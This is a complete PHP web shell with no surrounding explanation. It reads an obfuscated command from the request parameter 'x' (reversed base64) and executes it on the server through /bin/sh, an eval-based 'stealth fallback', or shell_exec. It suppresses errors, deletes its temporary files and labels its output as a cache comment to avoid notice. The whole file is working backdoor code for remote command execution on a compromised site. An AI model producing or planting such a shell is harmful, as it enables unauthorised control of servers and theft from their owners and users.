<?php
@error_reporting(0);
@ini_set('display_errors', 0);

$input = $_GET['x'] ?? $_POST['x'] ?? '';
if (empty($input)) die();

$cmd = base64_decode(strrev($input));   // Better obfuscation

$out = '';
$f = '/var/tmp/' . substr(md5(time() . rand()), 0, 14) . '.dat';

if (function_exists('pcntl_fork') && function_exists('pcntl_exec')) {
    $p = @pcntl_fork();
    if ($p == 0) {
        @pcntl_exec('/bin/sh', ['-c', $cmd . " > $f 2>&1"]);
        exit();
    }
    @sleep(1);
}

if (file_exists($f)) {
    $out = @file_get_contents($f);
    @unlink($f);
}

// Stealth Fallback
if (empty(trim($out))) {
    $t = '/var/tmp/' . substr(md5(uniqid()), 0, 12) . '.sess';
    $payload = "<?php @eval(base64_decode('" . base64_encode('echo shell_exec("'.$cmd.' 2>&1");') . "')); ?>";
    @file_put_contents($t, $payload);
    ob_start();
    @include($t);
    $out = ob_get_clean();
    @unlink($t);
}

if (empty(trim($out)) && function_exists('shell_exec')) {
    $out = @shell_exec($cmd . " 2>&1");
}

if (!empty(trim($out))) {
    echo "<!-- cache --> <pre>" . htmlspecialchars($out) . "</pre>";
} else {
    echo "ok";
}
?>
